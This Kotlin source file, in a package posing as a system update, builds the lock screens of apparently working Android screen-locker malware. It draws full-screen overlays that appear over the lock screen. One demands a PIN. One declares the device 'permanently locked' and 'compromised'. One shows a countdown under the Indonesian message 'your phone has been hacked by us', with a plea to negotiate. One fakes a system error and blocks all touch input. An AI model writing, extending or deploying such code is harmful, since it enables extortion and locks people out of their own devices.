package com.system.update

import android.animation.ObjectAnimator
import android.animation.ValueAnimator
import android.content.Context
import android.graphics.Color
import android.graphics.PixelFormat
import android.graphics.Typeface
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.InputType
import android.view.Gravity
import android.view.View
import android.view.WindowManager
import android.view.animation.AccelerateDecelerateInterpolator
import android.widget.*
import kotlin.math.sin

object LockOverlayView {

    // ============================================================
    // WINDOW PARAMS
    // ============================================================
    fun paramsFull(): WindowManager.LayoutParams {
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        else
            @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_PHONE

        return WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            type,
            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                    WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
                    WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
                    WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD,
            PixelFormat.TRANSLUCENT
        ).apply {
            gravity = Gravity.CENTER
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }
    }

    // ============================================================
    // LOCK PIN OVERLAY
    // ============================================================
    fun buildPin(ctx: Context, correctPin: String, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        // Glow merah di background
        val glow = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#8A0000"))
            alpha = 0.15f
        }
        root.addView(glow, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }

        // Icon tengkorak
        val skull = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 72f
            gravity = Gravity.CENTER
        }

        // Title
        val title = TextView(ctx).apply {
            text = "DEVICE TERKUNCI"
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 24f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, 16, 0, 8)
        }

        // Subtitle
        val subtitle = TextView(ctx).apply {
            text = "Masukkan PIN untuk membuka perangkat ini"
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 0, 0, 32)
        }

        // PIN input
        val pinInput = EditText(ctx).apply {
            hint = "• • • •"
            setHintTextColor(Color.parseColor("#3A0000"))
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 36f
            gravity = Gravity.CENTER
            inputType = InputType.TYPE_CLASS_NUMBER
            maxEms = 6
            letterSpacing = 0.4f
            setBackgroundColor(Color.parseColor("#141414"))
            setPadding(24, 20, 24, 20)
        }

        // Status text
        val status = TextView(ctx).apply {
            text = ""
            setTextColor(Color.parseColor("#E60000"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 16, 0, 16)
        }

        // Tombol BUKA
        val btn = Button(ctx).apply {
            text = "BUKA"
            setBackgroundColor(Color.parseColor("#8A0000"))
            setTextColor(Color.WHITE)
            textSize = 16f
            letterSpacing = 0.3f
        }

        btn.setOnClickListener {
            if (pinInput.text.toString().trim() == correctPin) {
                onUnlock(root)
            } else {
                status.text = "⚠ PIN SALAH — COBA LAGI"
                val anim = ObjectAnimator.ofFloat(
                    pinInput, "translationX",
                    0f, 30f, -30f, 30f, -30f, 0f
                )
                anim.duration = 420
                anim.start()
                status.animate().alpha(1f).setDuration(200).start()
                Handler(Looper.getMainLooper()).postDelayed({
                    status.animate().alpha(0f).setDuration(600).start()
                }, 1400)
            }
        }

        // Floating text berulang
        val floating = TextView(ctx).apply {
            text = "SYSTEM LOCKED • SYSTEM LOCKED"
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 11f
            alpha = 0.35f
            letterSpacing = 0.2f
            gravity = Gravity.CENTER
            setPadding(0, 24, 0, 0)
        }
        val floatAnim = ObjectAnimator.ofFloat(floating, "alpha", 0.15f, 0.7f, 0.15f).apply {
            duration = 1800
            repeatCount = ValueAnimator.INFINITE
            interpolator = AccelerateDecelerateInterpolator()
            start()
        }

        container.addView(skull)
        container.addView(title)
        container.addView(subtitle)
        container.addView(pinInput)
        container.addView(btn)
        container.addView(status)
        container.addView(floating)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        // Animasi pulse pada glow
        val glowAnim = ObjectAnimator.ofFloat(glow, "alpha", 0.1f, 0.25f, 0.1f).apply {
            duration = 2200
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        return root
    }

    // ============================================================
    // LOCK HARD OVERLAY (permanen, tengkorak besar)
    // ============================================================
    fun buildHard(ctx: Context): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val glow = View(ctx).apply {
            setBackgroundColor(Color.parseColor("#8A0000"))
            alpha = 0.25f
        }
        root.addView(glow, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT
        ))

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }

        val skull = TextView(ctx).apply {
            text = "☠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 140f
            gravity = Gravity.CENTER
        }
        // Animasi skull pulse
        val skullAnim = ObjectAnimator.ofFloat(skull, "scaleX", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }
        val skullAnimY = ObjectAnimator.ofFloat(skull, "scaleY", 1f, 1.15f, 1f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM COMPROMISED"
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 22f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.25f
            setPadding(0, 24, 0, 8)
        }

        val msg = TextView(ctx).apply {
            text = "Perangkat ini terkunci permanen.\nHubungi administrator untuk membuka."
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 8, 0, 32)
        }

        val warning = TextView(ctx).apply {
            text = "⚠ JANGAN MATIKAN DAYA ⚠"
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 14f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            alpha = 0.9f
        }
        val warnAnim = ObjectAnimator.ofFloat(warning, "alpha", 0.3f, 1f, 0.3f).apply {
            duration = 1200
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(skull)
        container.addView(title)
        container.addView(msg)
        container.addView(warning)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        val glowAnim = ObjectAnimator.ofFloat(glow, "alpha", 0.15f, 0.35f, 0.15f).apply {
            duration = 1800
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        return root
    }

    // ============================================================
    // LOCK JAM OVERLAY (timer countdown)
    // ============================================================
    fun buildTimer(ctx: Context, durationMs: Long, onUnlock: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(40, 40, 40, 40)
        }

        // Triangle warning
        val triangle = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#FFC107"))
            textSize = 100f
            gravity = Gravity.CENTER
        }
        val triAnim = ObjectAnimator.ofFloat(triangle, "alpha", 0.4f, 1f, 0.4f).apply {
            duration = 1400
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        val title = TextView(ctx).apply {
            text = "HP ANDA SUDAH KAMI RETAS"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 20f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.15f
            setPadding(0, 24, 0, 12)
        }

        val message = TextView(ctx).apply {
            text = "Mohon bicara baik-baik jika mau di lepas lock nya."
            setTextColor(Color.parseColor("#D4AF37"))
            textSize = 13f
            gravity = Gravity.CENTER
            lineSpacingMultiplier = 1.3f
            setPadding(0, 0, 0, 40)
        }

        val timerText = TextView(ctx).apply {
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 56f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.1f
        }

        val subTimer = TextView(ctx).apply {
            text = "WAKTU TERSISA"
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 11f
            gravity = Gravity.CENTER
            letterSpacing = 0.3f
            setPadding(0, 8, 0, 0)
        }

        container.addView(triangle)
        container.addView(title)
        container.addView(message)
        container.addView(timerText)
        container.addView(subTimer)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        // Timer
        val handler = Handler(Looper.getMainLooper())
        val endTime = System.currentTimeMillis() + durationMs
        val runnable = object : Runnable {
            override fun run() {
                val left = endTime - System.currentTimeMillis()
                if (left <= 0) {
                    onUnlock(root)
                    return
                }
                val h = left / 3_600_000
                val m = (left % 3_600_000) / 60_000
                val s = (left % 60_000) / 1000
                timerText.text = String.format("%02d : %02d : %02d", h, m, s)
                handler.postDelayed(this, 1000)
            }
        }
        handler.post(runnable)
        return root
    }

    // ============================================================
    // CRASH OVERLAY (touch disabled)
    // ============================================================
    fun buildCrash(ctx: Context, onDismiss: (View) -> Unit): View {
        val root = FrameLayout(ctx).apply {
            setBackgroundColor(Color.parseColor("#0A0A0A"))
            isClickable = true
            isFocusable = true
        }

        val container = LinearLayout(ctx).apply {
            orientation = LinearLayout.VERTICAL
            gravity = Gravity.CENTER
            setPadding(48, 48, 48, 48)
        }

        val error = TextView(ctx).apply {
            text = "⚠"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 80f
            gravity = Gravity.CENTER
        }

        val title = TextView(ctx).apply {
            text = "SYSTEM ERROR"
            setTextColor(Color.parseColor("#E60000"))
            textSize = 26f
            setTypeface(null, Typeface.BOLD)
            gravity = Gravity.CENTER
            letterSpacing = 0.25f
            setPadding(0, 16, 0, 8)
        }

        val msg = TextView(ctx).apply {
            text = "Sentuhan dinonaktifkan sementara.\nMenunggu perintah administrator."
            setTextColor(Color.parseColor("#9A9A9A"))
            textSize = 13f
            gravity = Gravity.CENTER
            setPadding(0, 8, 0, 32)
        }

        val hint = TextView(ctx).apply {
            text = "Touch disabled"
            setTextColor(Color.parseColor("#00FF66"))
            textSize = 12f
            gravity = Gravity.CENTER
            alpha = 0.5f
        }
        val hintAnim = ObjectAnimator.ofFloat(hint, "alpha", 0.15f, 0.7f, 0.15f).apply {
            duration = 1600
            repeatCount = ValueAnimator.INFINITE
            start()
        }

        container.addView(error)
        container.addView(title)
        container.addView(msg)
        container.addView(hint)

        val lp = FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.WRAP_CONTENT
        ).apply { gravity = Gravity.CENTER }
        root.addView(container, lp)

        // Block all touch events
        root.setOnTouchListener { _, _ -> true }

        return root
    }
}
